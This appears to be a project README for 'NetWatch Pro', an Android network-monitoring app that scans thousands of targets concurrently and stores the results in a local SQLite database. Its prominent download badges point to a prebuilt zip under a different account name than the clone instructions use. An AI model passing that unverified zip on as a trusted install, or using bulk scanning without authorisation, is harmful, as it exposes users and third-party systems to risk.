<div align="center">

🚀 NETWATCH PRO

⚡ Advanced Local-First Network Monitoring for Android

<p>
<strong>Scan Smarter&nbsp;&nbsp;•&nbsp;&nbsp;Monitor Locally&nbsp;&nbsp;•&nbsp;&nbsp;Stay in Control</strong>
</p>

<br>

<table>
<tr>
<td align="center">

📦 LATEST ANDROID BUILD

<strong>Take control of your monitoring workflow.</strong>

<br><br>

<a href="https://github.com/danyalasadpoor/cyber-net-probe/releases/download/Netwatch-pro/Netwatch-pro.zip">
<img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-00D4FF?style=for-the-badge&logo=android&logoColor=white" alt="Download NetWatch Pro">
</a>

<br><br>

<img src="https://img.shields.io/badge/RELEASE-v0.1.0-7C3AED?style=flat-square">
<img src="https://img.shields.io/badge/PLATFORM-ANDROID-3DDC84?style=flat-square&logo=android&logoColor=white">
<img src="https://img.shields.io/badge/STATUS-PRE--RELEASE-FFB000?style=flat-square">

<br><br>

<a href="https://github.com/danyalasadpoor/cyber-net-probe/releases/download/Netwatch-pro/Netwatch-pro.zip">
<strong>👉 GET NETWATCH PRO</strong>
</a>

</td>
</tr>
</table>

<br>

🛡️ <strong>Local-first. Private. Powerful.</strong>

<p>Your monitoring data stays on your device.</p>

<br>

✨ WHAT'S INSIDE

🔍 <strong>Scanner</strong>  |  📊 <strong>Analytics</strong>  |  🗃️ <strong>Local Database</strong>

Configurable scanning  |  Real-time statistics  |  SQLite-powered storage

<br><br>

🎯 <strong>Target Management</strong>  |  📥 <strong>Import & Export</strong>  |  📱 <strong>Android Ready</strong>

Organize targets  |  Backup & restore  |  Built with Capacitor

</div>

🔍 Advanced Scanner

NetWatch Pro allows users to scan a specific number of targets with configurable performance settings.

Supported scan sizes:

10 · 100 · 1,000 · 5,000 · 20,000+

Scanner features:

Configurable scan count

Concurrent workers

Configurable request timeout

Progress tracking

Online/offline classification

Latency measurement

Scan speed and ETA estimation

Scan cancellation

Persistent scan history

⚙️ Scanner Configuration

Users can customize scanner behavior through the Settings panel.

Setting

Range

Request Timeout

500 ms – 60,000 ms

Concurrency

1 – 64 workers

This allows users to balance scanning performance and device resource usage.

📊 Real-Time Statistics

During a scan, NetWatch Pro tracks:

Total targets

Completed targets

Online / Offline targets

Current target

Scan speed

Estimated time remaining

Scan status

Example:

Total:       5,000
Completed:   2,450
Online:      1,920
Offline:     530
Speed:       42 targets/sec
ETA:         60 seconds

🗃️ Local SQLite Database

NetWatch Pro uses a local SQLite database powered by:

@capacitor-community/sqlite

The database stores:

Data

Purpose

Targets

Monitored targets and their current status

Scans

Scan sessions and summary statistics

Scan Samples

Individual scan results and latency data

All core monitoring data is designed to remain local on the device.

📈 Dashboard Analytics

The dashboard provides a clear overview of the monitoring environment:

Total targets

Online / Offline status

Average latency

Recent scan activity

Target categories

Scan trends

Recent results

🎯 Target Management

Targets can be organized using:

Name

Address

Category

Tags

Notes

Favorite status

Availability

Latency

Last check time

📥 Import, Export & Backup

NetWatch Pro is designed to support local data management workflows:

📥 Target import

📤 Data export

📄 CSV workflows

🗃️ JSON backup workflows

💾 Complete backup creation

🔄 Restore from backup

All data processing is designed to happen locally on the device.

🛰️ Monitoring Workflow

1. Add or import targets
          ↓
2. Store targets in the local SQLite database
          ↓
3. Configure the scan
          ↓
4. Process targets using concurrent workers
          ↓
5. Collect status and latency results
          ↓
6. Save results and scan history

🏗️ Architecture

NetWatch Pro follows a modular local-first architecture.

Layer

Technology

Purpose

User Interface

React + TypeScript

Application interface

Styling

Tailwind CSS

Responsive UI styling

Build System

Vite

Development and production builds

Mobile Runtime

Capacitor

Android application runtime

Local Database

SQLite

On-device data storage

State Management

Zustand

Application state management

Scanner Engine

TypeScript

Concurrent target processing

Scanner Engine Capabilities

Concurrent workers

Configurable request timeout

Progress tracking

Latency measurement

Online/offline classification

Scan result persistence

📁 Project Structure

Directory / File

Purpose

android/

Android native project

public/

Static assets

src/components/

Reusable UI components

src/data/

Target data sources

src/lib/db.ts

Database operations

src/lib/scanner.ts

Scanner engine

src/lib/logger.ts

Application logging

src/lib/export.ts

Import and export utilities

src/lib/utils.ts

Shared utilities

src/pages/

Application pages

src/store/

Application state

src/types/

TypeScript definitions

capacitor.config.ts

Capacitor configuration

package.json

Project dependencies and scripts

vite.config.ts

Vite configuration

README.md

Project documentation

🛠️ Tech Stack

⚛️ React

🔷 TypeScript

🎨 Tailwind CSS

🧩 Lucide Icons

⚡ Vite

📱 Capacitor

🤖 Android

🗃️ SQLite

🧠 Zustand

⚡ Installation

1. Clone the Repository

git clone https://github.com/danyalasa/cyber-net-probe.git
cd cyber-net-probe

2. Install Dependencies

npm install

3. Start the Development Server

npm run dev

📱 Android Build

Build the Web Application

npm run build

Synchronize the Android Project

npx cap sync android

Open the Android Project

npx cap open android

The Android project can then be built using Android Studio.

🔄 Development Workflow

Install Dependencies

npm install

Start Development

npm run dev

Build After Making Changes

npm run build

Synchronize Android

npx cap sync android

🔐 Privacy

NetWatch Pro follows a local-first approach:

📱 Data can remain on-device

🗃️ Scan history is stored locally

🔒 No external server is required for the core workflow

🛡️ Users maintain control of their monitoring data

⚖️ Responsible Use

NetWatch Pro is intended for legitimate monitoring, testing, administration, and research of systems and targets that the user owns or has explicit permission to monitor.

⚠️ Only scan systems and targets that you are authorized to monitor.

🗺️ Roadmap

✅ Current Direction

Premium dark dashboard

React + TypeScript architecture

SQLite local database

Target management

Scan history

Configurable scanner

Android integration

Backup & restore workflows

🚧 In Development

Improved target import system

Advanced scan analytics

Improved real-time logging

Better large-dataset performance

Advanced filtering

Improved mobile optimization

🔮 Future Ideas

Scheduled monitoring

Notifications

Historical latency charts

Availability reports

Advanced target groups

Exportable reports

Multi-device synchronization

🤝 Contributing

Contributions, ideas, bug reports, and improvements are welcome.

Create a Feature Branch

git checkout -b feature/my-improvement

Then:

Make your changes

Test the project

Open a Pull Request

🐛 Bug Reports

When reporting a bug, please include:

Device model

Android version

Application version

Steps to reproduce

Expected behavior

Actual behavior

Relevant error messages

⭐ Support the Project

If you find NetWatch Pro interesting:

⭐ Star the repository

🐛 Report bugs

💡 Suggest features

🔧 Contribute improvements

📢 Share the project

<div align="center">

🛰️ NetWatch Pro

Scan Smarter. Monitor Locally. Stay in Control.

Built with ❤️ using React, TypeScript, SQLite, Vite, and Capacitor.

<br>

⭐ <strong>If you like the project, consider starring the repository!</strong> ⭐

</div>
